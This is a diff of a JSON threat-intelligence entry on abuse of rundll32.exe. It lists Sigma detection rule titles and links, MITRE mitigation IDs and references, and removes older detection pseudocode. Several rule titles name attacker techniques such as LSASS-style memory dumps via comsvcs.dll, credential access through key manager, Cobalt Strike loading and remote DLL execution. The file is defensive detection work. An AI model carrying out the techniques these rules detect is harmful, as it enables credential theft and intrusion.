+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules-threat-hunting/windows/process_creation/proc_creation_win_rundll32_dllregisterserver.yml"
+      },
+      {
+        "title": "Suspicious Renamed Comsvcs DLL Loaded By Rundll32",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/image_load/image_load_dll_comsvcs_load_renamed_version_by_rundll32.yml"
+      },
+      {
+        "title": "Remote DLL Load Via Rundll32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/image_load/image_load_rundll32_remote_share_load.yml"
+      },
+      {
+        "title": "Rundll32 Internet Connection",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/network_connection/net_connection_win_rundll32_net_connections.yml"
+      },
+      {
+        "title": "HackTool - F-Secure C3 Load by Rundll32",
+        "level": "critical",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_c3_rundll32_pattern.yml"
+      },
+      {
+        "title": "CobaltStrike Load by Rundll32",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_hktl_cobaltstrike_load_by_rundll32.yml"
+      },
+      {
+        "title": "Potential Renamed Rundll32 Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_renamed_rundll32_dllregisterserver.yml"
+      },
+      {
+        "title": "Potential Rundll32 Execution With DLL Stored In ADS",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_ads_stored_dll_execution.yml"
+      },
+      {
+        "title": "Suspicious Advpack Call Via Rundll32.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml"
+      },
+      {
+        "title": "Suspicious Rundll32 Invoking Inline VBScript",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_inline_vbs.yml"
+      },
+      {
+        "title": "Rundll32 InstallScreenSaver Execution",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_installscreensaver.yml"
+      },
+      {
+        "title": "Suspicious Key Manager Access",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_keymgr.yml"
+      },
+      {
+        "title": "Rundll32 Execution Without CommandLine Parameters",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_no_params.yml"
+      },
+      {
+        "title": "Suspicious NTLM Authentication on the Printer Spooler Service",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_ntlmrelay.yml"
+      },
+      {
+        "title": "Potential Obfuscated Ordinal Call Via Rundll32",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_obfuscated_ordinal_call.yml"
+      },
+      {
+        "title": "Rundll32 Spawned Via Explorer.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_parent_explorer.yml"
+      },
+      {
+        "title": "Process Memory Dump Via Comsvcs.DLL",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml"
+      },
+      {
+        "title": "Rundll32 Registered COM Objects",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_registered_com_objects.yml"
+      },
+      {
+        "title": "Shell32 DLL Execution in Suspicious Directory",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_shell32_susp_execution.yml"
+      },
+      {
+        "title": "Potential ShellDispatch.DLL Functionality Abuse",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_shelldispatch_potential_abuse.yml"
+      },
+      {
+        "title": "Potentially Suspicious Rundll32 Activity",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml"
+      },
+      {
+        "title": "Suspicious Control Panel DLL Load",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_control_dll_load.yml"
+      },
+      {
+        "title": "Suspicious Rundll32 Execution With Image Extension",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_execution_with_image_extension.yml"
+      },
+      {
+        "title": "ShimCache Flush",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_susp_shimcache_flush.yml"
+      },
+      {
+        "title": "Suspicious Rundll32 Activity Invoking Sys File",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_sys.yml"
+      },
+      {
+        "title": "Potentially Suspicious Rundll32.EXE Execution of UDL File",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_udl_exec.yml"
+      },
+      {
+        "title": "Rundll32 UNC Path Execution",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_unc_path.yml"
+      },
+      {
+        "title": "Rundll32 Execution With Uncommon DLL Extension",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_uncommon_dll_extension.yml"
+      },
+      {
+        "title": "Suspicious Workstation Locking via Rundll32",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_user32_dll.yml"
+      },
+      {
+        "title": "WebDav Client Execution Via Rundll32.EXE",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_execution.yml"
+      },
+      {
+        "title": "Suspicious WebDav Client Execution Via Rundll32.EXE",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution.yml"
+      },
+      {
+        "title": "Rundll32 Execution Without Parameters",
+        "level": "high",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/process_creation/proc_creation_win_rundll32_without_parameters.yml"
+      },
+      {
+        "title": "ScreenSaver Registry Key Set",
+        "level": "medium",
+        "url": "https://github.com/SigmaHQ/sigma/blob/7d8b152a5fc062ebd309f62ae4d8276aca2786af/rules/windows/registry/registry_set/registry_set_scr_file_executed_by_rundll32.yml"
+      }
+    ],
+    "related_sigma_rules": 100,
+    "other_rules": [
+      "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/rundll32_control_rundll_hunt.yml",
+      "https://raw.githubusercontent.com/elastic/detection-rules/main/rules/windows/execution_command_shell_via_rundll32.toml"
+    ]
+  },
   "related_CVE": [],
   "mitigations": [
-    "Analyze contextual data about executed DLL files, which may include information such as name, the content (ex: signature, headers, or data/media), age, user/ower, permissions, etc.",
-    "Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.",
-    "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n        \n        <h4>Implementation 1 : RunDLL32.exe Monitoring </h4> \n        \n        <h5> Detection Pseudocode </h5>\n        <code> processes = filter process where ((event_id == \"1\" OR event_id == \"4688\") AND exe == \"rundll32.exe\")</code>\n        \n        <h4> Detection Notes</h4>\n        \n        - Pseudocode Event IDs are for Sysmon (Event ID 10 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). \n        - When monitoring for all instances of Rundll32 execution, as defined by the logic in the Detection Pseudocode, it is imperative to also investigate the full set of command-line parameters used. These parameters contain key information about the DLL payload, including the name, entry point, and optional arguments.\n        - The Detection Pseudocode looks for any instances of rundll32.exe but does no other filtering, which may result in false positives. Therefore, we recommend tuning any such analytics by including additional logic (e.g., testing the name of the user that created the process) that helps reduce false positives.\"",
-    "Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls."
+    {
+      "id": "M1050",
+      "name": "Exploit Protection",
+      "technique": "T1218.011"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1548.002"
+    },
+    {
+      "id": "M1051",
+      "name": "Update Software",
+      "technique": "T1548.002"
+    },
+    {
+      "id": "M1047",
+      "name": "Audit",
+      "technique": "T1548.002"
+    },
+    {
+      "id": "M1052",
+      "name": "User Account Control",
+      "technique": "T1548.002"
+    },
+    {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "technique": "T1555.004"
+    },
+    {
+      "id": "M1026",
+      "name": "Privileged Account Management",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1040",
+      "name": "Behavior Prevention on Endpoint",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1028",
+      "name": "Operating System Configuration",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1027",
+      "name": "Password Policies",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1043",
+      "name": "Credential Access Protection",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1017",
+      "name": "User Training",
+      "technique": "T1003.001"
+    },
+    {
+      "id": "M1025",
+      "name": "Privileged Process Integrity",
+      "technique": "T1003.001"
+    }
   ],
+  "additional_mitigations": [],
   "references": [
     "https://attack.mitre.org/techniques/T1218/011/",
     "https://app.tidalcyber.com/technique/5652575d-cdb9-44ef-9c32-fff038f15444/",
     "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/",
     "https://strontic.github.io/xcyclopedia/library/rundll32.exe-10F08638E7C04D15BA4B4A740087A826.html"
-  ]
+  ],
+  "sources": {
+    "attack": "MITRE ATT&CK Enterprise v20.0",
+    "sigma": "SigmaHQ commit 7d8b152a5fc062ebd309f62ae4d8276aca2786af (rules under DRL 1.1)"
+  }
 }
